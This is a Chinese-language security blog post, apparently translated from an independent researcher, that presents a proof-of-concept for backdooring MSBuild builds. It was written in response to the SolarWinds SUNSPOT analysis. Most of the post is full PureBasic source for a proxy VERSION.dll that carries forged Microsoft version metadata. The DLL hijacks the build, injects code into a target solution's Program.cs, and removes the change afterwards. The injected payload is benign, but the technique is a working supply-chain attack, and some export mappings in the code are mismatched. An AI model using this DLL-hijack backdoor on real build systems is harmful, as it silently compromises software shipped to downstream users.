![](https://image.3001.net/images/20210121/1611220778_6009472abcace5e309c66.png!small)

## 写在前面的话

在2020年，不同的美国联邦政府分支机构都受到了 _大规模数据泄露_
的影响。其中很大一部分可以归结于针对SolarWinds的供应链攻击，包括其旗舰产品SolarWinds
Orion的基础设施建设。2021年1月11日，CrowdStrike情报小组发布了一份[分析报告](https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/)，分析了部署到SolarWinds构建环境中的一个恶意工具，而该恶意工具能够在构建时将SUNBURST后门注入SolarWinds
Orion平台之中。

CrowdStrike的博客文章是一位同事介绍给我的。SUNBURST的开发人员会尝试每秒都去搜索MSBuild.exe进程，然后读取这些远程进程中的虚拟内存来确定现在构建的是否是正确的解决方案。除此之外，SUNBURST攻击者还会创建一个计划任务，在目标设备每次启动时执行后门植入操作。

实际上，我认为这种方式是很粗糙也很草率的，那怎么做才会更好呢？我们接着往下看！

## MSBuild回顾

MSBuild微软引擎在构建应用程序时，绝大多数时候都会使用XML文件来指导目标解决方案的构建过程。

在检查MSBuild.exe的代码时，你首先会注意到的一件事情就是它本审就是一个.NET程序集。那么，哪种方法才是后门化任意.NET程序集的最佳方法呢？

没错，就是使用version.dll。

运行任意解决方案的快速构建后（比如说使用C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
SomeProject.sln /t:Build
/p:Configuration=Release;Platform=Win64），并使用ProcMon记录程序执行路径，我们会发现程序会在MSBuild.exe目录下搜索多个DLL文件：

    
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoree.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ole32.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\api-ms-win-core-winrt-l1-1-0.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\VERSION.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\api-ms-win-core-winrt-string-l1-1-0.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\sxs.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WindowsCodecs.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"}
    
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\VERSION.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Csc.exe"}
    
    {"type":"load-not-found-dll","event_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscoree.dll","process_image_path":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Csc.exe"}

因此，我们就可以直接对MSBuild.exe或C#编译器（Csc.exe）下手了！正如CrowdStrike所提到的，植入的后门代码已经检查出了正确的解决方案，所以我们在测试中也将针对MSBuild.exe文件进行操作。

## VERSION.dll结构

我们已经知道，VERSION.dll会导出17个不同的名称，我们需要去实现这些内容以确定目标的正常功能不受影响。

    
    
    __export_name(GetFileVersionInfoA)
    
    __export_name(GetFileVersionInfoByHandle)
    
    __export_name(GetFileVersionInfoExA)
    
    __export_name(GetFileVersionInfoExW)
    
    __export_name(GetFileVersionInfoSizeA)
    
    __export_name(GetFileVersionInfoSizeExA)
    
    __export_name(GetFileVersionInfoSizeExW)
    
    __export_name(GetFileVersionInfoSizeW)
    
    __export_name(GetFileVersionInfoW)
    
    __export_name(VerFindFileA)
    
    __export_name(VerFindFileW)
    
    __export_name(VerInstallFileA)
    
    __export_name(VerInstallFileW)
    
    __export_name(VerLanguageNameA)
    
    __export_name(VerLanguageNameW)
    
    __export_name(VerQueryValueA)
    
    __export_name(VerQueryValueW)

## 概念验证PoC

我们的PoC会在DLL中实现后门功能，而不需要每秒读取远程进程内存或触发进程搜索。PoC将用PureBasic编写，因为没有一个正常的攻击者会在其中实现他的植入，因此不需要考虑复制粘贴这个源代码；-）

### 目标分析

注入的代码应具有以下特征：

> 没有其他正在运行的进程；
>
> 无远程进程操作（读取/写入远程进程内存等）；
>
> 生成正确解决方案的唯一触发器；
>
> 在生成过程中插入后门
>
> 在生成过程之后删除后门源文件；

### 目标实现

正如我们前面看到的，VERSION.dll文件很早就由.NET运行时加载了。通过实现mock函数，不仅可以验证是否加载了DLL，而且还可以知道在执行构建过程之前调用了GetFileVersionInfoSizeW函数，如下图所示：

![](https://image.3001.net/images/20210121/1611220819_6009475360201b22b6592.png!small)

考虑到这一点，那么我们就可以不依赖DllMain函数中任何不成熟的解决方案，而只需劫持GetFileVersionInfoSizeW调用，执行我们的后门插入代码，然后调用真正的GetFileVersionInfoSizeW函数并返回其结果，就可以绕过加载程序锁的任何问题。

在下面的PoC中，后门被插入到对GetFileVersionInfoSizeW的调用中。整个过程中，源代码保存在内存中，只要用DLL_PROCESS_DETACH调用DllMain，就可以通过还原以前的源代码来删除后门代码。

## 总结

通过将我们的VERSION.dll拷贝到MSBuild目录下，我们可以更好地确保操作的安全性，因为不需要创建额外的进程，可以省略内存搜索并捕获每一次的构建操作，因为我们的代码是由MSBuild直接执行的。

![](https://image.3001.net/images/20210121/1611220826_6009475ae98a80d6b6d71.png!small)

## 源码获取

源码以及预编译代码可以在点击【[ _这里_](https://github.com/marpie/a12d404.net-files/tree/master/msbuild-backdoor)】获取。

    
    
    ; ***************************************************************************
    
    ; *                                                                         *
    
    ; * Author:      marpie (marpie@a12d404.net)                                *
    
    ; * License:     BSD 2-clause                                               *
    
    ; * Copyright:   (c) 2021, a12d404.net                                      *
    
    ; * Status:      Prototype                                                  *
    
    ; * Created:     20200116                                                   *
    
    ; * Last Update: 20200117                                                   *
    
    ; *                                                                         *
    
    ; ***************************************************************************
    
    EnableExplicit
    
     
    
    ; ---------------------------------------------------------------------------    
    ;- Consts
    
     
    
    #TARGET_SOLUTION = "ConsoleApp1.sln"
    
    #BACKDOOR_CODE = "public Class1() { Console.WriteLine(" + Chr(34) + "Hello from the Static initializer!" + Chr(34) + "); }"
    
    #BACKDOOR_INSERT_AFTER = "class Class1 {"
    
     
    
    #BACKDOOR_ALIVE = $c45c9bda8db1
    
    #MIN_SIZE = 100 ; 100 bytes
    
     
    
    ; ---------------------------------------------------------------------------    
    ;- Variables
    
    Global mux.i = #Null      ; set in DLL_PROCESS_ATTACH
    
    Global hVersion.i = #Null ; orig version.dll handle
    
    Global active.i = 0       ; checked in CleanupBackdoor
    
     
    
    Global origContent.s = ""   ; ptr to memory of the original source
    
    Global origContentSize.i = 0 ; size of the original source
    
     
    
    ; ---------------------------------------------------------------------------    
    ;- Backdoor Handling
    
     
    
    Procedure.s GetTargetFilePath()
    
      Define i.i
    
      Define path.s
    
      For i = 0 To CountProgramParameters()
    
        path = ProgramParameter(i)
    
        If CountString(path, #TARGET_SOLUTION) > 0
    
          ProcedureReturn GetPathPart(path) + "Program.cs"
    
        EndIf
    
      Next
    
      ProcedureReturn ""
    
    EndProcedure
    
     
    
    Procedure.b ReadOrigContent(hFile.i)
    
      Define res.b = #False
    
      FileSeek(hFile, 0, #PB_Absolute)
    
      Define size.i = Lof(hFile)
    
      Define *mem = AllocateMemory(size)
    
      If ReadData(hFile, *mem, size) <> size
    
        Goto ReadAllCleanup
    
      EndIf
    
      origContent = PeekS(*mem, size, #PB_UTF8)
    
      origContentSize = Len(origContent)
    
      res = #True
    
    ReadAllCleanup:
    
      If *mem
    
        FreeMemory(*mem)
    
      EndIf
    
      ProcedureReturn res
    
    EndProcedure
    
     
    
    ; InsertBackdoor needs to be called from a function holing mux!
    
    Procedure.b InsertBackdoor(path.s)
    
      Define res.b = #False
    
      
    
      Define hFile.i = OpenFile(#PB_Any, path, #PB_File_SharedRead | #PB_UTF8)
    
      If Not hFile
    
        ProcedureReturn res
    
      EndIf
    
      
    
      ; read file content
    
      If Not ReadOrigContent(hFile)
    
        Goto InsertBackdoorError
    
      EndIf
    
      
    
      ; check if the right code is present
    
      Define pos.i = FindString(origContent, #BACKDOOR_INSERT_AFTER)-1
    
      If pos < 0
    
        Goto InsertBackdoorError
    
      EndIf
    
      
    
      ; revert file to 0
    
      FileSeek(hFile, 0, #PB_Absolute)
    
      TruncateFile(hFile)
    
      
    
      ; write content till start of backdoor
    
      Define writeSize.i = pos+Len(#BACKDOOR_INSERT_AFTER)
    
      Define sizeLeft = writeSize
    
      If WriteString(hFile, Left(origContent, writeSize), #PB_UTF8) = 0
    
        ; we should add a restore of the original file here
    
        ; ... depending on the write error ...
    
        Goto InsertBackdoorError
    
      EndIf
    
      
    
      ; write backdoor
    
      writeSize = Len(#BACKDOOR_CODE)
    
      
    
      If WriteString(hFile, #BACKDOOR_CODE, #PB_UTF8) = 0
    
        ; we should add a restore of the original file here
    
        ; ... depending on the write error ...
    
        Goto InsertBackdoorError
    
      EndIf
    
      
    
      ; write rest of file
    
      writeSize = origContentSize-sizeLeft
    
      If WriteString(hFile, Right(origContent, writeSize), #PB_UTF8) = 0
    
        ; we should add a restore of the original file here
    
        ; ... depending on the write error ...
    
        Goto InsertBackdoorError
    
      EndIf
    
      
    
      res = #True
    
    InsertBackdoorCleanup:
    
      CloseFile(hFile)
    
      ProcedureReturn res
    
    InsertBackdoorError:  
    
      If Len(origContent) > 0
    
        origContent = ""
    
        origContentSize= 0
    
      EndIf
    
      Goto InsertBackdoorCleanup
    
    EndProcedure
    
     
    
    Procedure ActivateBackdoor()
    
      LockMutex(mux)
    
      ; check if the backdoor is already alive
    
      If #BACKDOOR_ALIVE = active
    
        Goto ActivateBackdoorCleanup
    
      EndIf
    
      ; check if we have the right solution
    
      Define targetFilepath.s = GetTargetFilePath()
    
      If Len(targetFilepath) < 1
    
        Goto ActivateBackdoorCleanup
    
      EndIf
    
      
    
      MessageRequester("ActivateBackdoor", "Hello World from Solution: " + #CRLF$ + ProgramParameter(0))
    
      
    
      ; init backdoor
    
      If InsertBackdoor(targetFilepath)
    
        active = #BACKDOOR_ALIVE
    
        MessageRequester("ActivateBackdoor", "... backdoor insered ...")
    
      Else
    
        MessageRequester("ActivateBackdoor", "... backdooring failed ...")
    
      EndIf
    
      
    
    ActivateBackdoorCleanup:
    
      UnlockMutex(mux)
    
      ProcedureReturn
    
    EndProcedure
    
     
    
    Procedure CleanupBackdoor()
    
      LockMutex(mux)
    
      If #BACKDOOR_ALIVE = active
    
        active = #Null
    
        ; Do cleanup here
    
        If origContentSize <> 0
    
          Define hFile.i = CreateFile(#PB_Any, GetTargetFilePath(), #PB_UTF8)
    
          If hFile
    
            WriteString(hFile, origContent, #PB_UTF8)
    
            CloseFile(hFile)
    
          EndIf
    
          origContent = ""
    
          origContentSize = 0
    
        EndIf
    
      EndIf
    
    CleanupBackdoorCleanup:
    
      UnlockMutex(mux)
    
      ProcedureReturn
    
    EndProcedure
    
     
    
    ; ---------------------------------------------------------------------------    
    ;- DllMain Stuff
    
     
    
    ProcedureDLL AttachProcess(Instance)
    
      mux = CreateMutex()
    
    EndProcedure
    
     
    
    ProcedureDLL DetachProcess(Instance)
    
      CleanupBackdoor()
    
    EndProcedure
    
     
    
    ; ---------------------------------------------------------------------------    
    ;- orig VERSION.dll Stuff
    
     
    
    Procedure.i LoadVersionDll()
    
      Define res.i = #Null
    
      LockMutex(mux)
    
      If #Null = hVersion
    
        ; load version.dll
    
        Define dllPath.s = GetEnvironmentVariable("windir") + "\system32\version.dll"
    
        hVersion = OpenLibrary(#PB_Any, dllPath)
    
      EndIf
    
      res = hVersion
    
    CleanupLoadVersionDll:
    
      UnlockMutex(mux)
    
      ProcedureReturn res
    
    EndProcedure
    
     
    
    ;BOOL GetFileVersionInfoA(
    
    ;  LPCSTR lptstrFilename,
    
    ;  DWORD  dwHandle,
    
    ;  DWORD  dwLen,
    
    ;  LPVOID lpData
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoA(a1.i, a2.l, a3.l, a4.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoA", a1, a2, a3, a4)
    
    EndProcedure
    
     
    
    ;BOOL GetFileVersionInfoExA(
    
    ;  DWORD  dwFlags,
    
    ;  LPCSTR lpwstrFilename,
    
    ;  DWORD  dwHandle,
    
    ;  DWORD  dwLen,
    
    ;  LPVOID lpData
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoExA(a1.l, a2.i, a3.l, a4.l, a5.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoExA", a1, a2, a3, a4, a5)
    
    EndProcedure
    
     
    
    ;BOOL GetFileVersionInfoExW(
    
    ;  DWORD   dwFlags,
    
    ;  LPCWSTR lpwstrFilename,
    
    ;  DWORD   dwHandle,
    
    ;  DWORD   dwLen,
    
    ;  LPVOID  lpData
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoSizeExW(a1.l, a2.i, a3.l, a4.l, a5.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoSizeExW", a1, a2, a3, a4, a5)
    
    EndProcedure
    
     
    
    ;DWORD GetFileVersionInfoSizeA(
    
    ;  LPCSTR  lptstrFilename,
    
    ;  LPDWORD lpdwHandle
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoSizeA(a1.i, a2.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoSizeA", a1, a2)
    
    EndProcedure
    
     
    
    ;DWORD GetFileVersionInfoSizeExA(
    
    ;  DWORD   dwFlags,
    
    ;  LPCSTR  lpwstrFilename,
    
    ;  LPDWORD lpdwHandle
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoSizeExA(a1.l, a2.i, a3.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoSizeExA", a1, a2, a3)
    
    EndProcedure
    
     
    
    ;DWORD GetFileVersionInfoSizeExW(
    
    ;  DWORD   dwFlags,
    
    ;  LPCWSTR lpwstrFilename,
    
    ;  LPDWORD lpdwHandle
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoExW(a1.l, a2.i, a3.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoExW", a1, a2, a3)
    
    EndProcedure
    
     
    
    ;DWORD GetFileVersionInfoSizeW(
    
    ;  LPCWSTR lptstrFilename,
    
    ;  LPDWORD lpdwHandle
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoSizeW(a1.i, a2.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoExW", a1, a2)
    
    EndProcedure
    
     
    
    ;BOOL GetFileVersionInfoW(
    
    ;  LPCWSTR lptstrFilename,
    
    ;  DWORD   dwHandle,
    
    ;  DWORD   dwLen,
    
    ;  LPVOID  lpData
    
    ;);
    
    ProcedureDLL.i GetFileVersionInfoW(a1.i, a2.l, a3.l, a4.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoW", a1, a2, a3, a4)
    
    EndProcedure
    
     
    
    ; int hMem, LPCWSTR lpFileName, int v2, int v3
    
    ProcedureDLL.i GetFileVersionInfoByHandle(a1.i, a2.i, a3.i, a4.l)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "GetFileVersionInfoByHandle", a1, a2, a3, a4)
    
    EndProcedure
    
     
    
    ;DWORD VerFindFileA(
    
    ;  DWORD  uFlags,
    
    ;  LPCSTR szFileName,
    
    ;  LPCSTR szWinDir,
    
    ;  LPCSTR szAppDir,
    
    ;  LPSTR  szCurDir,
    
    ;  PUINT  puCurDirLen,
    
    ;  LPSTR  szDestDir,
    
    ;  PUINT  puDestDirLen
    
    ;);
    
    ProcedureDLL.i VerFindFileA(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerFindFileA", a1, a2, a3, a4, a5, a6, a7, a8)
    
    EndProcedure
    
     
    
    ;DWORD VerFindFileW(
    
    ;  DWORD   uFlags,
    
    ;  LPCWSTR szFileName,
    
    ;  LPCWSTR szWinDir,
    
    ;  LPCWSTR szAppDir,
    
    ;  LPWSTR  szCurDir,
    
    ;  PUINT   puCurDirLen,
    
    ;  LPWSTR  szDestDir,
    
    ;  PUINT   puDestDirLen
    
    ;);
    
    ProcedureDLL.i VerFindFileW(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerFindFileW", a1, a2, a3, a4, a5, a6, a7, a8)
    
    EndProcedure
    
     
    
    ;DWORD VerInstallFileA(
    
    ;  DWORD  uFlags,
    
    ;  LPCSTR szSrcFileName,
    
    ;  LPCSTR szDestFileName,
    
    ;  LPCSTR szSrcDir,
    
    ;  LPCSTR szDestDir,
    
    ;  LPCSTR szCurDir,
    
    ;  LPSTR  szTmpFile,
    
    ;  PUINT  puTmpFileLen
    
    ;);
    
    ProcedureDLL.i VerInstallFileA(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerInstallFileA", a1, a2, a3, a4, a5, a6, a7, a8)
    
    EndProcedure
    
     
    
    ;DWORD VerInstallFileW(
    
    ;  DWORD   uFlags,
    
    ;  LPCWSTR szSrcFileName,
    
    ;  LPCWSTR szDestFileName,
    
    ;  LPCWSTR szSrcDir,
    
    ;  LPCWSTR szDestDir,
    
    ;  LPCWSTR szCurDir,
    
    ;  LPWSTR  szTmpFile,
    
    ;  PUINT   puTmpFileLen
    
    ;);
    
    ProcedureDLL.i VerInstallFileW(a1.l, a2.i, a3.i, a4.i, a5.i, a6.i, a7.i, a8.i)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerInstallFileW", a1, a2, a3, a4, a5, a6, a7, a8)
    
    EndProcedure
    
     
    
    ;DWORD VerLanguageNameA(
    
    ;  DWORD wLang,
    
    ;  LPSTR szLang,
    
    ;  DWORD cchLang
    
    ;);
    
    ProcedureDLL.i VerLanguageNameA(a1.l, a2.i, a3.l)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerLanguageNameA", a1, a2, a3)
    
    EndProcedure
    
     
    
    ;DWORD VerLanguageNameW(
    
    ;  DWORD  wLang,
    
    ;  LPWSTR szLang,
    
    ;  DWORD  cchLang
    
    ;);
    
    ProcedureDLL.i VerLanguageNameW(a1.l, a2.i, a3.l)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerLanguageNameW", a1, a2, a3)
    
    EndProcedure
    
     
    
    ;BOOL VerQueryValueA(
    
    ;  LPCVOID pBlock,
    
    ;  LPCSTR  lpSubBlock,
    
    ;  LPVOID  *lplpBuffer,
    
    ;  PUINT   puLen
    
    ;);
    
    ProcedureDLL.i VerQueryValueA(a1.i, a2.i, a3.i, a4.l)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerQueryValueA", a1, a2, a3, a4)
    
    EndProcedure
    
     
    
    ;BOOL VerQueryValueW(
    
    ;  LPCVOID pBlock,
    
    ;  LPCWSTR lpSubBlock,
    
    ;  LPVOID  *lplpBuffer,
    
    ;  PUINT   puLen
    
    ;);
    
    ProcedureDLL.i VerQueryValueW(a1.i, a2.i, a3.i, a4.l)
    
      ActivateBackdoor()
    
      ProcedureReturn CallCFunction(LoadVersionDll(), "VerQueryValueW", a1, a2, a3, a4)
    
    EndProcedure
    
     
    
    ; ---------------------------------------------------------------------------    
     
    
    ; IDE Options = PureBasic 5.73 LTS (Windows - x64)
    
    ; ExecutableFormat = Shared dll
    
    ; CursorPosition = 85
    
    ; FirstLine = 60
    
    ; Folding = -----    
    ; Executable = version.dll
    
    ; CompileSourceDirectory
    
    ; EnablePurifier
    
    ; IncludeVersionInfo
    
    ; VersionField2 = Microsoft Corporation
    
    ; VersionField3 = Microsoft® Windows® Operating System
    
    ; VersionField5 = 10.0.20190.1000 (WinBuild.160101.0800)
    
    ; VersionField6 = Version Checking and File Installation Libraries
    
    ; VersionField7 = version
    
    ; VersionField8 = VERSION.DLL
    
    ; VersionField9 = © Microsoft Corporation. All rights reserved.
    
    ; VersionField15 = VOS_NT
    
    ; VersionField16 = VFT_DLL

